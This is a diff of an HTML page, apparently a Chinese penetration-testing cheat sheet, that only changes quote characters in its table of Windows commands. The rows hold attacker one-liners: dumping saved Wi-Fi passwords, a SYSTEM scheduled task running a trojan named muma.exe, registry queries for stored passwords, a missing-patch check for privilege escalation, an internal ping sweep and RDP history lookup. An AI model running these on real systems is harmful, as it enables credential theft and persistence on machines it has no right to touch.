@@ -425,11 +425,11 @@
 <td>识别开机启动的程序</td>
 </tr>
 <tr>
-<td align="left">wmic process where(description=”mysqld.exe”)&gt;&gt;mysql.log</td>
+<td align="left">wmic process where(description=&quot;mysqld.exe&quot;)&gt;&gt;mysql.log</td>
 <td>获取软件安装路径</td>
 </tr>
 <tr>
-<td align="left">for /f “skip=9 tokens=1,2 delims=:” %i in (‘netsh wlan showprofiles’) do @echo %j | findstr-i -v echo | netsh wlan show profiles %jkey=clear</td>
+<td align="left">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#39;netsh wlan showprofiles&#39;) do @echo %j | findstr-i -v echo | netsh wlan show profiles %jkey=clear</td>
 <td>一键获取wifi密码</td>
 </tr>
 <tr>
@@ -441,18 +441,18 @@
 <td>查看登录情况</td>
 </tr>
 <tr>
-<td align="left">schtasks.exe /Create /RU”SYSTEM” /SC MINUTE /MO 45 /TN FIREWALL /TR “c:/muma.ex  e” /ED 2017/4/7</td>
+<td align="left">schtasks.exe /Create /RU &quot;SYSTEM&quot; /SC MINUTE /MO 45 /TN FIREWALL /TR &quot;c:/muma.exe&quot; /ED 2017/4/7</td>
 <td>添加计划任务</td>
 </tr>
 <tr>
-<td align="left">REG query HKCU /v “pwd” /s</td>
+<td align="left">REG query HKCU /v  &quot;pwd&quot; /s</td>
 <td>获取保存到注册表中的密码</td>
 </tr>
 </tbody></table>
 <h3 id="提权补丁"><a href="#提权补丁" class="headerlink" title="提权补丁"></a>提权补丁</h3><table>
 <thead>
 <tr>
-<th>set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;setKB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;setKB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;setKB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;setKB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280)do @type a.txt|@find /i “%i”||@echo %%i% Not Installed!)&amp;del /f/q /a a.txt</th>
+<th>set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;setKB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;setKB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;setKB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;setKB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280)do @type a.txt|@find /i &quot;%i&quot;||@echo %%i% Not Installed!)&amp;del /f/q /a a.txt</th>
 <th>windows未打补丁情况</th>
 </tr>
 </thead>
@@ -497,7 +497,7 @@
 <td>查看防火墙策略</td>
 </tr>
 <tr>
-<td>for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i”ttl”</td>
+<td>for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;</td>
 <td>批量扫描内网存活主机</td>
 </tr>
 </tbody></table>
@@ -625,7 +625,7 @@
 <td>远程主机上无需管理员权限,查询到主机名和用户</td>
 </tr>
 <tr>
-<td>reg query “HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT”</td>
+<td>reg query &quot;HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT&quot;</td>
 <td>获取最近mstsc登录的记录</td>
 </tr>
 </tbody></table>
